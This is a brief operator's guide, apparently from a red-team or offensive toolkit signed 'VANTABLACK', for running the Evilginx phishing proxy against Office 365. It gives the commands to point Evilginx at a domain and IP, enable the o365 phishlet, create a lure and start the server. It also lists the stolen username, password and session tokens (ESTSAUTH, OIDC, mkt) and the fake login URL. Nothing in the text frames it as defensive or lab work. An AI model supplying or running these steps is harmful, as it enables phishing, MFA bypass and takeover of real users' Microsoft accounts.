# Evilginx Guide for Office 365

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable o365
landers create o365
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Username | `username` |
| Password | `password` |

## Tokens Captured

- `ESTSAUTH` - ESTS authentication
- `OIDC` - OIDC token
- `mkt` - Market token

## Login URL

```
https://your-domain.com/o365/login
```

---

**VANTABLACK**
